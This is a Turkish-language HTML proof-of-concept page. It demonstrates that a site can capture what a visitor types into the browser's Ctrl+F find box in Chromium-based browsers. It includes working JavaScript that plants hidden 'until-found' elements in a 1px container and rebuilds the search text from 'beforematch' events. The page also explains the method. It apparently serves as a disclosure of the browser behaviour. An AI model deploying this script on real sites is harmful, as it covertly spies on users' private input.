<!DOCTYPE html>
<html lang="tr" dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width">
<meta name="robots" content="All">

<title>PoC: Ctrl+F (Sayfada Bul) Girdisinin Ele Geçirilmesi</title>

<script src="https://cdn.tailwindcss.com"></script>

<style>
  .textblack { color: #000 }
  .textcenter { text-align: center }
  .textblue { color: #4169e1 }
  .flex { display: flex }
  p { font-family: Klee One, cursive }
</style>

<link rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">

<link rel="stylesheet"
      href="https://fonts.googleapis.com/css?family=Noto+Sans+JP:400,700&display=swap">

<link rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Klee+One:wght@400;600&display=swap">

<script>
let detectedSequence = "";
const detected = new Set;
let container;

function cleanupOldCandidates(n) {
  container && container.querySelectorAll('p[id^="c_"]').forEach(e => {
    var t = e.getAttribute("data-sequence").length;
    if (t !== 1 && (t < n || t > n + 1)) e.remove();
  });
}

function generateCandidates(t = "") {
  if (container) {
    var n =
      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";

    t.length > 0 && cleanupOldCandidates(t.length);

    for (let e = 0; e < n.length; e++) {
      var d = t + n[e];
      const a = "c_" + encodeURIComponent(d);

      if (!container.querySelector("#" + CSS.escape(a))) {
        const c = document.createElement("p");

        c.hidden = "until-found";
        c.id = a;
        c.setAttribute("data-sequence", d);

        d.endsWith(" ")
          ? c.textContent = d + "\u200B"
          : c.textContent = d;

        c.style.fontSize = "1px";
        c.style.margin = "0";
        c.style.padding = "0";
        c.style.lineHeight = "1px";

        c.addEventListener("beforematch", e => {
          var t, n;
          var d = c.getAttribute("data-sequence");

          if (d.length === 1) {
            detectedSequence = d;
            document.getElementById("result").textContent = d;
            detected.add(a);
            generateCandidates(d);
          } else if (!detected.has(a) && d.length > detectedSequence.length) {
            detected.add(a);
            t = "c_" + encodeURIComponent(detectedSequence);
            n = container.querySelector("#" + CSS.escape(t));
            if (n) {
              n.setAttribute("hidden", "until-found");
              detected.delete(t);
            }
            detectedSequence = d;
            generateCandidates(document.getElementById("result").textContent = d);
          }
        });

        container.appendChild(c);
      }
    }
  }
}

window.addEventListener("load", () => {
  container = document.getElementById("search-candidates");
  generateCandidates();
});
</script>
</head>

<body>

<div id="search-candidates"
     style="font-size:1px; line-height:1px; height:1px; overflow:hidden;">
</div>

<br>

<h1 class="text-3xl font-bold textcenter">
  Sayfa İçi Arama (Ctrl+F) Girdisinin Ele Geçirilmesi
</h1>

<br>

<div id="main" class="main py-6 sm:py-8 lg:py-12">
<div class="mx-auto max-w-screen-md px-4 md:px-8">

<div class="bg-white rounded-lg shadow-lg p-8 mb-8 border border-gray-200">
  <div class="flex items-center gap-4">
    <span class="text-xl text-gray-700 font-medium">Algılanan Arama:</span>
    <span id="result"
          class="text-4xl font-bold text-blue-600 font-mono"></span>
  </div>

  <p class="text-lg mt-4">
    Tarayıcının <strong>Ctrl+F (Sayfada Bul)</strong> özelliğini kullanarak
    örnek olarak <strong>“a1b2c3”</strong> aratmayı deneyin.
  </p>
</div>

<h1 class="textblue mb-2 text-xl font-semibold sm:text-2xl md:mb-4">
  Genel Bakış
</h1>

<p class="mb-6 sm:text-lg md:mb-8">
  Chromium tabanlı tarayıcılarda, sadece sayfa içi aramada eşleştiğinde
  görünür olan <code>hidden="until-found"</code> adlı özel bir HTML niteliği
  bulunmaktadır.
  Bu PoC, her karakter için gizli elementler oluşturarak kullanıcının
  Ctrl+F sırasında yazdığı metni adım adım çözümleyebilir.
</p>

<h1 class="textblue mb-2 text-xl font-semibold sm:text-2xl md:mb-4">
  Elementler Nerede Saklanıyor?
</h1>

<p class="mb-6 sm:text-lg md:mb-8">
  Bu teknik çok sayıda HTML elementi gerektirir.
  Tüm bu elementler 1x1 boyutunda, kullanıcıdan tamamen gizli bir
  konteyner içerisinde tutulur.
</p>

<h1 class="textblue mb-2 text-xl font-semibold sm:text-2xl md:mb-4">
  Boşluk Karakteri Nasıl Algılanıyor?
</h1>

<p class="mb-6 sm:text-lg md:mb-8">
  HTML içerisinde boşluk karakterleri tek başına indekslenmediği için,
  boşluk karakterinin arkasına görünmez bir
  <strong>zero-width space (\u200B)</strong> eklenir.
  Böylece Ctrl+F boşlukları da algılayabilir.
</p>

<h1 class="textblue mb-2 text-xl font-semibold sm:text-2xl md:mb-4">
  Silme (Backspace) Algılama
</h1>

<p class="mb-6 sm:text-lg md:mb-8">
  <del>
    Silme işlemi algılanmaya çalışıldı ancak tarayıcı davranışları
    tutarsız olduğu için güvenilir sonuç alınamadı.
  </del>
  Şu anki sürümde, tüm tek karakterli adaylar saklanarak,
  kullanıcı yeni bir arama başlattığında tekrar algılama yapılabiliyor.
</p>

<h1 class="textblue mb-2 text-xl font-semibold sm:text-2xl md:mb-4">
  Teşekkür
</h1>

<p class="mb-6 sm:text-lg md:mb-8">
  <code>hidden="until-found"</code> özelliği aşağıdaki yazı sayesinde
  keşfedilmiştir. Bu PoC, o çalışmayı genişleterek
  tam metin elde etmeye olanak tanır.
  <br><br>
  <a href="https://techracho.bpsinc.jp/baba/2026_01_14/155955" target="_blank">
    Sayfa içi arama metni site sahibine görünebilir mi? – TechRacho
  </a>
</p>


</div>
</div>

</body>
</html>
